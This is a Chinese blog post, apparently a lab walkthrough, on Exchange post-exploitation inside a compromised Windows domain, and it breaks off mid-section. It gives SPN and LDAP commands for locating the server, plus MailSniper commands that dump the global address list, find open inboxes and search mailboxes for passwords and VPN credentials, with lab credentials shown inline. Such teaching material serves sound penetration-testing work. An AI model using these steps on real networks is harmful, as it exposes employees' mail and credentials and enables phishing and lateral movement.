<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Exchange 后渗透利用 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="Exchange 在内网中的价值Exchange Server 是企业内网中的核心邮件系统，通常包含大量敏感信息：  通讯录数据：完整的组织架构和员工联系方式 邮件内容：可能包含密码、VPN 凭证、系统文档 高权限账户：Exchange 管理员通常拥有域内高权限 横向跳板：Exchange 服务器通常可以访问多个内网区域  在获取域内普通用户权限后，定位并利用 Exchange 服务器是提升权限和">
<meta property="og:type" content="article">
<meta property="og:title" content="Exchange 后渗透利用">
<meta property="og:url" content="https://www.52jl.top/2026/02/12/exchange/index.html">
<meta property="og:site_name" content="kenny&#39;s blog">
<meta property="og:description" content="Exchange 在内网中的价值Exchange Server 是企业内网中的核心邮件系统，通常包含大量敏感信息：  通讯录数据：完整的组织架构和员工联系方式 邮件内容：可能包含密码、VPN 凭证、系统文档 高权限账户：Exchange 管理员通常拥有域内高权限 横向跳板：Exchange 服务器通常可以访问多个内网区域  在获取域内普通用户权限后，定位并利用 Exchange 服务器是提升权限和">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-10.webp">
<meta property="article:published_time" content="2026-02-12T02:26:18.000Z">
<meta property="article:modified_time" content="2026-02-13T11:11:35.233Z">
<meta property="article:author" content="Kenny">
<meta property="article:tag" content="Exchange">
<meta property="article:tag" content="内网渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-10.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Exchange 后渗透利用",
  "url": "https://www.52jl.top/2026/02/12/exchange/",
  "image": "https://www.52jl.top/img/covers/shinchan-cover-10.webp",
  "datePublished": "2026-02-12T02:26:18.000Z",
  "dateModified": "2026-02-13T11:11:35.233Z",
  "author": [
    {
      "@type": "Person",
      "name": "Kenny",
      "url": "https://www.52jl.top"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/12/exchange/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: false,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Exchange 后渗透利用',
  isHighlightShrink: false,
  isToc: false,
  pageType: 'post'
}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260214a"><meta name="referrer" content="no-referrer">
<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
<script>
(() => {
  try {
    if (window.top !== window.self) {
      window.top.location = window.self.location.href;
      return;
    }

    const host = window.location.hostname;
    const isLocal = host === 'localhost' || host === '127.0.0.1';
    if (!isLocal && window.location.protocol === 'http:') {
      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
    }
  } catch (e) {}
})();
</script>
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
<script>
(() => {
  try {
    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
    if (!isAutomation) return;
    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
    selectors.forEach((s) => {
      document.querySelectorAll(s).forEach((el) => {
        el.innerHTML = '<p>Content unavailable.</p>';
      });
    });
  } catch (e) {}
})();
</script>
</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/systeminfo-risk/"><i class="fa-fw fas fa-shield-halved"></i><span> systeminfo 补丁风险分析</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Exchange 后渗透利用</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/systeminfo-risk/"><i class="fa-fw fas fa-shield-halved"></i><span> systeminfo 补丁风险分析</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Exchange 后渗透利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-12T02:26:18.000Z" title="发表于 2026-02-12 10:26:18">2026-02-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T11:11:35.233Z" title="更新于 2026-02-13 19:11:35">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="Exchange-在内网中的价值"><a href="#Exchange-在内网中的价值" class="headerlink" title="Exchange 在内网中的价值"></a>Exchange 在内网中的价值</h1><p>Exchange Server 是企业内网中的核心邮件系统，通常包含大量敏感信息：</p>
<ul>
<li><strong>通讯录数据</strong>：完整的组织架构和员工联系方式</li>
<li><strong>邮件内容</strong>：可能包含密码、VPN 凭证、系统文档</li>
<li><strong>高权限账户</strong>：Exchange 管理员通常拥有域内高权限</li>
<li><strong>横向跳板</strong>：Exchange 服务器通常可以访问多个内网区域</li>
</ul>
<p>在获取域内普通用户权限后，定位并利用 Exchange 服务器是提升权限和扩大战果的关键步骤。</p>
<hr>
<h1 id="域内定位-Exchange"><a href="#域内定位-Exchange" class="headerlink" title="域内定位 Exchange"></a>域内定位 Exchange</h1><h2 id="SPN-定位-Exchange"><a href="#SPN-定位-Exchange" class="headerlink" title="SPN 定位 Exchange"></a>SPN 定位 Exchange</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SPN（Service Principal Name）是 Kerberos 认证中用于标识服务的唯一标识符。Exchange 服务器会在域内注册多个 SPN，通过查询 SPN 可以快速定位 Exchange 服务器。</p>
<h3 id="实战操作"><a href="#实战操作" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>1. 查询域内所有 SPN</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T <span class="number">0</span>day.org -q */*</span><br></pre></td></tr></table></figure>

<p><img src="/2026/02/12/exchange/1.webp" loading='lazy'></p>
<p><strong>参数说明</strong>：</p>
<ul>
<li><code>-T</code>：指定域名</li>
<li><code>-q */*</code>：查询所有 SPN</li>
</ul>
<p><strong>2. 过滤 Exchange 相关 SPN</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T <span class="number">0</span>day.org -q */* | <span class="built_in">findstr</span> &quot;exchange&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2026/02/12/exchange/2.webp" loading='lazy'></p>
<p><strong>常见的 Exchange SPN</strong>：</p>
<ul>
<li><code>exchangeMDB</code>：邮箱数据库服务</li>
<li><code>exchangeRFR</code>：地址簿服务</li>
<li><code>exchangeAB</code>：地址簿服务</li>
<li><code>HTTP</code>：OWA（Outlook Web Access）服务</li>
<li><code>SMTP</code>：邮件传输服务</li>
</ul>
<p><strong>3. 解析 Exchange 服务器 IP</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup OWA2010SP3.<span class="number">0</span>day.org</span><br></pre></td></tr></table></figure>

<p>或使用 ping：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ping</span> -n <span class="number">1</span> OWA2010SP3.<span class="number">0</span>day.org</span><br></pre></td></tr></table></figure>

<p><img src="/2026/02/12/exchange/3.webp" loading='lazy'></p>
<p><strong>结果</strong>：定位到 Exchange 服务器 IP 为 192.168.3.144</p>
<hr>
<h3 id="使用-PowerShell-自动化定位"><a href="#使用-PowerShell-自动化定位" class="headerlink" title="使用 PowerShell 自动化定位"></a>使用 PowerShell 自动化定位</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询 Exchange SPN 并解析 IP</span></span><br><span class="line"><span class="variable">$domain</span> = <span class="string">&quot;0day.org&quot;</span></span><br><span class="line"><span class="variable">$searcher</span> = <span class="built_in">New-Object</span> System.DirectoryServices.DirectorySearcher</span><br><span class="line"><span class="variable">$searcher</span>.Filter = <span class="string">&quot;(&amp;(objectClass=serviceConnectionPoint)(|(keywords=67661d7F-8FC4-4fa7-BFAC-E1D7794C1F68)(keywords=77378F46-2C66-4aa9-A6A6-3E7A48B19596)))&quot;</span></span><br><span class="line"><span class="variable">$searcher</span>.SearchRoot = <span class="string">&quot;LDAP://DC=<span class="variable">$</span>(<span class="variable">$domain</span>.Replace(&#x27;.&#x27;,&#x27;,DC=&#x27;))&quot;</span></span><br><span class="line"><span class="variable">$results</span> = <span class="variable">$searcher</span>.FindAll()</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">in</span> <span class="variable">$results</span>) &#123;</span><br><span class="line">    <span class="variable">$server</span> = <span class="variable">$result</span>.Properties[<span class="string">&quot;servicebindinginfo&quot;</span>]</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Exchange Server: <span class="variable">$server</span>&quot;</span></span><br><span class="line">    <span class="variable">$hostname</span> = <span class="variable">$server</span> <span class="operator">-replace</span> <span class="string">&quot;.*://&quot;</span>, <span class="string">&quot;&quot;</span> <span class="operator">-replace</span> <span class="string">&quot;:.*&quot;</span>, <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="variable">$ip</span> = [<span class="type">System.Net.Dns</span>]::GetHostAddresses(<span class="variable">$hostname</span>).IPAddressToString</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;IP Address: <span class="variable">$ip</span>&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="LDAP-定位-Exchange"><a href="#LDAP-定位-Exchange" class="headerlink" title="LDAP 定位 Exchange"></a>LDAP 定位 Exchange</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>Exchange 服务器的配置信息存储在 Active Directory 的 Configuration 分区中。通过 LDAP 查询可以获取 Exchange 服务器的详细信息。</p>
<h3 id="使用-ADExplorer-定位"><a href="#使用-ADExplorer-定位" class="headerlink" title="使用 ADExplorer 定位"></a>使用 ADExplorer 定位</h3><p><strong>1. 下载 ADExplorer</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://learn.microsoft.com/zh-cn/sysinternals/downloads/adexplorer</span><br></pre></td></tr></table></figure>

<p><strong>2. 连接到域控制器</strong>：</p>
<ul>
<li>打开 ADExplorer</li>
<li>输入域控制器地址</li>
<li>使用域用户凭证登录</li>
</ul>
<p><strong>3. 搜索 Exchange 服务器</strong>：</p>
<p>在搜索框中输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CN=Microsoft Exchange</span><br></pre></td></tr></table></figure>

<p>或搜索特定的 Exchange 对象类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectClass=msExchExchangeServer</span><br></pre></td></tr></table></figure>

<p><img src="/2026/02/12/exchange/5.webp" loading='lazy'></p>
<p><strong>4. 查看 Exchange 服务器属性</strong>：</p>
<ul>
<li><code>networkAddress</code>：服务器的网络地址</li>
<li><code>msExchServerSite</code>：服务器所在的 AD 站点</li>
<li><code>versionNumber</code>：Exchange 版本号</li>
</ul>
<hr>
<h3 id="使用-PowerShell-LDAP-查询"><a href="#使用-PowerShell-LDAP-查询" class="headerlink" title="使用 PowerShell LDAP 查询"></a>使用 PowerShell LDAP 查询</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询 Exchange 服务器</span></span><br><span class="line"><span class="variable">$searcher</span> = <span class="built_in">New-Object</span> System.DirectoryServices.DirectorySearcher</span><br><span class="line"><span class="variable">$searcher</span>.Filter = <span class="string">&quot;(objectClass=msExchExchangeServer)&quot;</span></span><br><span class="line"><span class="variable">$searcher</span>.SearchRoot = <span class="string">&quot;LDAP://CN=Configuration,DC=0day,DC=org&quot;</span></span><br><span class="line"><span class="variable">$results</span> = <span class="variable">$searcher</span>.FindAll()</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">in</span> <span class="variable">$results</span>) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$result</span>.Properties[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    <span class="variable">$version</span> = <span class="variable">$result</span>.Properties[<span class="string">&quot;versionNumber&quot;</span>]</span><br><span class="line">    <span class="variable">$site</span> = <span class="variable">$result</span>.Properties[<span class="string">&quot;msExchServerSite&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Server Name: <span class="variable">$name</span>&quot;</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Version: <span class="variable">$version</span>&quot;</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;Site: <span class="variable">$site</span>&quot;</span></span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;---&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="使用-ldapsearch（Linux）"><a href="#使用-ldapsearch（Linux）" class="headerlink" title="使用 ldapsearch（Linux）"></a>使用 ldapsearch（Linux）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.3.10 -D <span class="string">&quot;jerry@0day.org&quot;</span> -w <span class="string">&quot;Admin12345&quot;</span> \</span><br><span class="line">  -b <span class="string">&quot;CN=Configuration,DC=0day,DC=org&quot;</span> \</span><br><span class="line">  <span class="string">&quot;(objectClass=msExchExchangeServer)&quot;</span> \</span><br><span class="line">  name networkAddress msExchServerSite</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="邮件数据利用"><a href="#邮件数据利用" class="headerlink" title="邮件数据利用"></a>邮件数据利用</h1><h2 id="MailSniper-工具介绍"><a href="#MailSniper-工具介绍" class="headerlink" title="MailSniper 工具介绍"></a>MailSniper 工具介绍</h2><p>MailSniper 是一款专门用于 Exchange 渗透的 PowerShell 工具，支持：</p>
<ul>
<li>导出全局地址列表（GAL）</li>
<li>搜索邮件内容中的敏感信息</li>
<li>检测公开的邮箱目录</li>
<li>枚举高权限用户的邮箱</li>
</ul>
<p><strong>项目地址</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/dafthack/MailSniper</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="导出全局通讯录"><a href="#导出全局通讯录" class="headerlink" title="导出全局通讯录"></a>导出全局通讯录</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>全局地址列表（Global Address List, GAL）包含域内所有用户的邮箱地址、姓名、部门等信息。通过 EWS（Exchange Web Services）API 可以导出完整的通讯录。</p>
<h3 id="实战操作-1"><a href="#实战操作-1" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>1. 导入 MailSniper 模块</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-exec</span> bypass</span><br><span class="line"><span class="built_in">Import-Module</span> .\MailSniper.ps1</span><br></pre></td></tr></table></figure>

<p><strong>2. 导出全局地址列表</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-GlobalAddressList</span> <span class="literal">-ExchHostname</span> <span class="number">192.168</span>.<span class="number">3.144</span> <span class="literal">-UserName</span> rootkit\jerry <span class="literal">-Password</span> Admin12345 <span class="literal">-OutFile</span> global<span class="literal">-address-list</span>.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2026/02/12/exchange/4.webp" loading='lazy'></p>
<p><strong>参数说明</strong>：</p>
<ul>
<li><code>-ExchHostname</code>：Exchange 服务器地址</li>
<li><code>-UserName</code>：域用户名（格式：域名\用户名）</li>
<li><code>-Password</code>：用户密码</li>
<li><code>-OutFile</code>：输出文件路径</li>
</ul>
<p><strong>3. 分析通讯录数据</strong>：</p>
<p>导出的文件包含：</p>
<ul>
<li>用户邮箱地址</li>
<li>显示名称</li>
<li>部门信息</li>
<li>职位信息</li>
</ul>
<p><strong>利用价值</strong>：</p>
<ul>
<li>识别高价值目标（CEO、CTO、IT 管理员）</li>
<li>构建钓鱼攻击的目标列表</li>
<li>分析组织架构</li>
</ul>
<hr>
<h2 id="检测公开邮箱目录"><a href="#检测公开邮箱目录" class="headerlink" title="检测公开邮箱目录"></a>检测公开邮箱目录</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>某些用户可能将邮箱设置为”公开”，允许其他用户访问。通过 EWS API 可以检测哪些邮箱是公开的。</p>
<h3 id="实战操作-2"><a href="#实战操作-2" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>1. 准备邮箱地址列表</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从通讯录中提取邮箱地址</span></span><br><span class="line"><span class="built_in">cat</span> global-address-list.txt | grep <span class="string">&quot;@&quot;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; mail.txt</span><br></pre></td></tr></table></figure>

<p><strong>2. 检测公开邮箱</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-OpenInboxFinder</span> <span class="literal">-EmailList</span> .\mail.txt <span class="literal">-ExchHostname</span> <span class="number">192.168</span>.<span class="number">3.144</span> <span class="literal">-Remote</span></span><br></pre></td></tr></table></figure>

<p><strong>参数说明</strong>：</p>
<ul>
<li><code>-EmailList</code>：邮箱地址列表文件</li>
<li><code>-ExchHostname</code>：Exchange 服务器地址</li>
<li><code>-Remote</code>：使用远程 EWS 端点</li>
</ul>
<p><strong>输出示例</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] Found open inbox: admin@rootkit.org</span><br><span class="line">[+] Found open inbox: backup@rootkit.org</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="搜索高权限用户邮箱"><a href="#搜索高权限用户邮箱" class="headerlink" title="搜索高权限用户邮箱"></a>搜索高权限用户邮箱</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>通过搜索特定用户的邮箱，可以发现包含敏感信息的邮件，如密码、VPN 凭证、系统文档等。</p>
<h3 id="实战操作-3"><a href="#实战操作-3" class="headerlink" title="实战操作"></a>实战操作</h3><p><strong>1. 搜索特定用户的邮箱</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-SelfSearch</span> <span class="literal">-Mailbox</span> jerry@rootkit.org <span class="literal">-Terms</span> *pass* <span class="literal">-Folder</span> all <span class="literal">-ExchHostname</span> <span class="number">192.168</span>.<span class="number">3.144</span> <span class="literal">-OutputCsv</span> passwords.csv <span class="literal">-Remote</span></span><br></pre></td></tr></table></figure>

<p><strong>参数说明</strong>：</p>
<ul>
<li><code>-Mailbox</code>：目标邮箱地址</li>
<li><code>-Terms</code>：搜索关键词（支持通配符）</li>
<li><code>-Folder</code>：搜索范围（all &#x3D; 所有文件夹）</li>
<li><code>-OutputCsv</code>：输出 CSV 文件</li>
</ul>
<p><strong>2. 常用搜索关键词</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索密码相关</span></span><br><span class="line"><span class="literal">-Terms</span> *pass*,*<span class="built_in">pwd</span>*,*password*,*credential*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索 VPN 相关</span></span><br><span class="line"><span class="literal">-Terms</span> *vpn*,*remote*,*access*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索系统文档</span></span><br><span class="line"><span class="literal">-Terms</span> *admin*,*root*,*server*,*config*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索财务信息</span></span><br><span class="line"><span class="literal">-Terms</span> *bank*,*account*,*invoice*</span><br></pre></td></tr></table></figure>

<p><strong>3. 分析搜索结果</strong>：</p>
<p>导出的 CSV 文件包含：</p>
<ul>
<li>邮件主题</li>
<li>发件人</li>
<li>收件人</li>
<li>邮件正文片段</li>
<li>附件名称</li>
</ul>
<hr>
<h2 id="从-EWS-获取-AD-用户名"><a href="#从-EWS-获取-AD-用户名" class="headerlink" title="从 EWS 获取 AD 用户名"></a>从 EWS 获取 AD 用户名</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>通过 EWS API 可以将邮箱地址解析为对应的 AD 用户名，用于后续的横向移动。</p>
<h3 id="实战操作-4"><a href="#实战操作-4" class="headerlink" title="实战操作"></a>实战操作</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUsernameFromEWS</span> <span class="literal">-EmailList</span> email<span class="literal">-list</span>.txt <span class="literal">-ExchHostname</span> <span class="number">192.168</span>.<span class="number">3.144</span> <span class="literal">-Remote</span></span><br></pre></td></tr></table></figure>

<p><strong>输出示例</strong>：</p>
